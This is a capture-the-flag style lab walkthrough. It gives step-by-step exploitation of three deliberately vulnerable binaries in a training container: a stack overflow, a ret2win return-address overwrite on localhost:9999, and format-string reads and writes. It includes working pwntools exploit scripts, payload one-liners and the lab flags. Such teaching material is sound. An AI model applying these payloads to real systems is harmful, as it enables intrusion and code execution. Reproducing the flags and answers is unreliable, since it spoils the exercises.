# Buffer Overflow Walkthrough

Step-by-step guide for exploiting the CyberLab buffer overflow servers.

---

## Lab 1: Stack Variable Overwrite (stack-vuln)

**Target:** `/app/stack-vuln` in the buffer-overflow container
**Goal:** Bypass authentication by overwriting a variable
**Flag:** `FLAG{st4ck_sm4sh1ng_succ3ss}`

### Step 1: Access the Container

```bash
# Connect to the buffer overflow container
docker exec -it lab-buffer-overflow /bin/bash

# Check available binaries
ls -la /app/
```

### Step 2: Run and Analyze the Program

```bash
# Run the program normally
/app/stack-vuln

# Output:
# ╔══════════════════════════════════════════════╗
# ║     AUTHENTICATION BYPASS CHALLENGE          ║
# ╠══════════════════════════════════════════════╣
# ║  Objective: Bypass authentication without    ║
# ║             knowing the password             ║
# ╠══════════════════════════════════════════════╣
# ║  Hints:                                      ║
# ║  - Buffer size: 32 bytes                     ║
# ║  - authenticated var is AFTER buffer         ║
# ║  - Overflow to set authenticated != 0        ║
# ╚══════════════════════════════════════════════╝
#
# Password:
```

### Step 3: Understand the Vulnerability

Looking at the source code (or decompiling):

```c
int authenticated = 0;    // Target variable
char password[32];        // Buffer

gets(password);           // Vulnerable - no bounds checking

if (authenticated) {
    print_flag();
}
```

The stack layout:
```
+----------------+ Low Address
| password[0]    |
| password[1]    |
|    ...         |
| password[31]   |
+----------------+
| authenticated  |  <-- We need to overwrite this!
+----------------+ High Address
```

### Step 4: Test Normal Input

```bash
echo "test" | /app/stack-vuln
# Output shows: authenticated = 0x00000000
# ACCESS DENIED
```

### Step 5: Overflow the Buffer

```bash
# Send exactly 32 characters (fills buffer)
python3 -c "print('A'*32)" | /app/stack-vuln
# Still shows: authenticated = 0x00000000

# Send 33 characters (overflows into authenticated)
python3 -c "print('A'*33)" | /app/stack-vuln
# Shows: authenticated = 0x00000041 (0x41 = 'A')
# ACCESS GRANTED!
# FLAG{st4ck_sm4sh1ng_succ3ss}
```

### Step 6: Alternative Exploits

```bash
# Just need any non-zero value
python3 -c "print('A'*32 + '\x01')" | /app/stack-vuln

# Or specific value
python3 -c "print('A'*32 + 'AAAA')" | /app/stack-vuln
# authenticated = 0x41414141
```

---

## Lab 2: Return Address Overwrite (vuln-server)

**Target:** Port 9999 on localhost
**Goal:** Call secret_function() to get the flag
**Flag:** `FLAG{buff3r_0v3rfl0w_m4st3r}`

### Step 1: Connect and Gather Information

```bash
# Connect to the server
nc localhost 9999

# Output:
# ╔══════════════════════════════════════════════╗
# ║     VULNERABLE SERVER v1.0                   ║
# ║     Buffer Overflow Practice                 ║
# ╠══════════════════════════════════════════════╣
# ║  Target: Overflow the buffer to call         ║
# ║          secret_function()                   ║
# ╠══════════════════════════════════════════════╣
# ║  Hints:                                      ║
# ║  - Buffer size: 64 bytes                     ║
# ║  - secret_function: 0x401196                 ║  <-- Note this address!
# ║  - Find the offset to overwrite RIP          ║
# ╚══════════════════════════════════════════════╝
#
# Enter your input:
```

**Important:** Note the `secret_function` address (may vary).

### Step 2: Find the Offset

We need to determine exactly how many bytes to overflow before reaching the return address.

```bash
# Install pwntools if needed
pip install pwntools

# Generate a cyclic pattern
python3 -c "from pwn import *; print(cyclic(100).decode())"
# Output: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

### Step 3: Send Pattern and Analyze Crash

```bash
# Send pattern to server
python3 -c "from pwn import *; print(cyclic(100).decode())" | nc localhost 9999
```

If we had GDB attached, we'd see the crash address. For this server:
- Buffer: 64 bytes
- Saved RBP: 8 bytes
- **Total offset to return address: 72 bytes**

### Step 4: Verify Offset

```bash
# Test with exact offset
python3 -c "print('A'*72 + 'BBBBBBBB')" | nc localhost 9999

# The server will try to return to 0x4242424242424242 (BBBBBBBB)
# and crash/hang
```

### Step 5: Build the Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.arch = 'amd64'
context.log_level = 'info'

# Connect to server
p = remote('localhost', 9999)

# Receive banner
banner = p.recvuntil(b'Enter your input:')
print(banner.decode())

# Parse secret_function address from banner
# Look for line like: secret_function: 0x401196
# For simplicity, hardcode if known:
secret_function = 0x401196

print(f"[+] Target address: {hex(secret_function)}")

# Build payload
offset = 72  # 64 bytes buffer + 8 bytes saved RBP
payload = b'A' * offset
payload += p64(secret_function)

print(f"[+] Payload length: {len(payload)}")
print(f"[+] Sending payload...")

# Send payload
p.sendline(payload)

# Receive response
p.interactive()
```

### Step 6: Run the Exploit

```bash
# Save as exploit.py and run
python3 exploit.py

# Expected output:
# [+] Opening connection to localhost on port 9999: Done
# [+] Target address: 0x401196
# [+] Payload length: 80
# [+] Sending payload...
# [*] Switching to interactive mode
#
# You entered: AAAAAAAA...
#
# ========================================
#   CONGRATULATIONS! You called secret_function!
#   FLAG{buff3r_0v3rfl0w_m4st3r}
# ========================================
```

### Step 7: Get Shell (Bonus)

After printing the flag, secret_function gives you a shell:

```bash
# In the interactive session
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
```

---

## Lab 3: Format String Exploitation (format-vuln)

**Target:** `/app/format-vuln` in the buffer-overflow container
**Goals:**
1. Leak the flag from memory
2. Modify secret_value to 0x41414141
**Flags:**
- `FLAG{f0rm4t_str1ng_m4st3r}` (in memory)
- `FLAG{f0rm4t_wr1t3_pr1m1t1v3}` (by modifying secret_value)

### Step 1: Run and Analyze

```bash
docker exec -it lab-buffer-overflow /bin/bash

/app/format-vuln

# Output:
# ╔══════════════════════════════════════════════╗
# ║     FORMAT STRING VULNERABILITY LAB          ║
# ╠══════════════════════════════════════════════╣
# ║  Objectives:                                 ║
# ║  1. Leak the secret_value from memory        ║
# ║  2. Read the flag from memory                ║
# ║  3. Modify secret_value to 0x41414141        ║
# ╠══════════════════════════════════════════════╣
# ║  Hints:                                      ║
# ║  - Try %x, %p, %s, %n format specifiers      ║
# ║  - secret_value @ 0x404050                   ║  <-- Note address
# ║  - flag @ 0x404060                           ║  <-- Note address
# ╚══════════════════════════════════════════════╝
#
# Enter string (or 'quit'):
```

### Step 2: Test Format String Vulnerability

```bash
# Normal input
hello
# Output: You entered: hello

# Format string test
%x
# Output: You entered: 7ffd8a3c1234  (leaks stack data!)

# Multiple format specifiers
%x.%x.%x.%x.%x.%x
# Output: Shows multiple stack values
```

### Step 3: Leak Memory with %p

```bash
# Use %p for pointer format (cleaner output)
%p.%p.%p.%p.%p.%p.%p.%p
# Output shows stack pointers

# Use positional access
%1$p    # 1st value
%2$p    # 2nd value
%6$p    # 6th value (often interesting)
```

### Step 4: Read the Flag (%s)

The flag is stored at the address shown in the banner. We need to read it using %s.

```bash
# Method: Put the address on the stack, then use %s to read from it

# First, find where our input appears on the stack
AAAA.%p.%p.%p.%p.%p.%p.%p.%p
# Look for 0x41414141 (AAAA in hex)
# Count how many %p until you see your input

# If AAAA appears at position 7:
# We can use %7$s to read a string from that address
```

Using Python for precision:

```python
#!/usr/bin/env python3
from pwn import *

p = process('/app/format-vuln')
p.recvuntil(b'flag @')
flag_addr = int(p.recvline().strip(), 16)
print(f"Flag at: {hex(flag_addr)}")

p.recvuntil(b'Enter string')

# Put address + use %s to read from it
# This depends on stack layout - may need adjustment
payload = p64(flag_addr) + b'%7$s'
p.sendline(payload)
print(p.recvline())
```

### Step 5: Modify secret_value with %n

**Warning:** %n writes to memory. Be careful!

```bash
# %n writes the count of characters printed so far
# To write 0x41414141 = 1094795585 decimal, we'd need to print that many chars

# Simpler approach: write smaller values with %hn (2 bytes) or %hhn (1 byte)
```

Exploit script for writing:

```python
#!/usr/bin/env python3
from pwn import *

p = process('/app/format-vuln')
p.recvuntil(b'secret_value @')
secret_addr = int(p.recvline().strip(), 16)
print(f"secret_value at: {hex(secret_addr)}")

p.recvuntil(b'Enter string')

# We need to write 0x41414141 to secret_addr
# Using %n which writes number of chars printed

# Build payload with pwntools fmtstr
# This is complex - using simplified approach:
# Write 'AAAA' (0x41414141) by printing 0x41414141 chars then %n

# Simplified: Just demonstrate the concept
# In practice, use pwntools' fmtstr_payload()

from pwnlib.fmtstr import fmtstr_payload
payload = fmtstr_payload(offset=6, writes={secret_addr: 0x41414141})
p.sendline(payload)
p.interactive()
```

### Step 6: Verify Modification

```bash
# After sending the %n payload
# Check DEBUG output:
# [DEBUG] secret_value = 0x41414141
#
# [+] SECRET VALUE MODIFIED!
# [+] FLAG{f0rm4t_str1ng_m4st3r}
# [+] BONUS FLAG: FLAG{f0rm4t_wr1t3_pr1m1t1v3}
```

---

## GDB Debugging Session

### Debugging vuln-server

```bash
# Inside container
docker exec -it lab-buffer-overflow /bin/bash

# Start GDB
gdb /app/vuln-server

# Set breakpoints
(gdb) break main
(gdb) break vulnerable_function

# Run
(gdb) run

# When at vulnerable_function, examine stack:
(gdb) info frame
(gdb) x/20x $rsp

# Step through strcpy
(gdb) ni
(gdb) ni

# After overflow, check return address:
(gdb) x/gx $rbp+8
```

### Finding Offset with GDB

```bash
# In GDB, generate pattern
(gdb) shell python3 -c "from pwn import *; print(cyclic(100).decode())"

# Run program with pattern as input
(gdb) run
# Enter pattern when prompted

# When it crashes, check RIP:
(gdb) info registers rip
# Or:
(gdb) x/gx $rsp

# Find offset
# shell python3 -c "from pwn import *; print(cyclic_find(0x????????))"
```

---

## Common Issues and Solutions

### Program crashes but no shell

```bash
# Stack alignment issue on 64-bit
# Add a ret gadget before the target address

# Find a ret gadget
objdump -d binary | grep "ret"

# New payload:
payload = b'A' * offset
payload += p64(ret_gadget)      # Stack alignment
payload += p64(secret_function)
```

### Address contains null bytes

```bash
# Null bytes (0x00) terminate strcpy
# Solutions:
# 1. Find addresses without null bytes
# 2. Use different overflow technique
# 3. Encode payload differently
```

### Wrong architecture

```python
# Make sure pwntools context is correct
context.arch = 'amd64'  # For 64-bit
# or
context.arch = 'i386'   # For 32-bit

# Check binary architecture
file /app/vuln-server
# Output: ELF 64-bit LSB executable, x86-64
```

---

## Quick Reference

### pwntools Commands

```python
# Connect
p = remote('host', port)
p = process('./binary')

# Receive
p.recv(1024)
p.recvline()
p.recvuntil(b'text')

# Send
p.send(data)
p.sendline(data)
p.sendafter(b'prompt', data)

# Pack addresses
p64(addr)  # 64-bit little-endian
p32(addr)  # 32-bit little-endian

# Patterns
cyclic(100)
cyclic_find(value)

# Interactive
p.interactive()
```

### GDB Commands

```bash
# Breakpoints
break main
break *0x401234

# Execution
run / r
continue / c
step / s
next / n
stepi / si
nexti / ni

# Examine
x/20x $rsp     # 20 hex words
x/s addr       # String
x/i $rip       # Instruction
info registers
info frame

# Memory
vmmap          # (pwndbg)
checksec       # (pwndbg)
```

---

**Next:** [Hints](./hints.md) | **Continue to:** [05 - Password Attacks](../05-password-attacks/)
